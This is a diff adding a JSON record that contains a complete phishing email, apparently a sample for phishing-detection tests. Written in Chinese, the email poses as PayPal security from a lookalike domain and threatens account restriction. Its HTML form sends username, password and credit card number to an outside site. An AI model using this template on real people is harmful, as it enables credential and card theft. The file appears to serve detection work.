@@ -1,0 +1,3 @@
+{
+  "email": "From: \"PayPal Security\" <security@paypal-secure.com>\nTo: user@example.com\nSubject: 【重要】您的PayPal账户需要更新\nContent-Type: text/html; charset=utf-8\n\n<html>\n<body>\n<h2>PayPal账户安全通知</h2>\n<p>尊敬的PayPal用户，</p>\n<p>我们需要您更新账户信息以符合最新的安全标准。请填写以下表单完成验证：</p>\n<form action=\"http://paypal-secure-verify.com/submit\" method=\"post\">\n  <p>用户名: <input type=\"text\" name=\"username\"></p>\n  <p>密码: <input type=\"password\" name=\"password\"></p>\n  <p>信用卡号: <input type=\"text\" name=\"credit_card\"></p>\n  <p><input type=\"submit\" value=\"立即验证\"></p>\n</form>\n<p>如果您不完成验证，您的账户将在48小时内被限制使用。</p>\n<p>此致<br>PayPal安全团队</p>\n</body>\n</html>"
+}
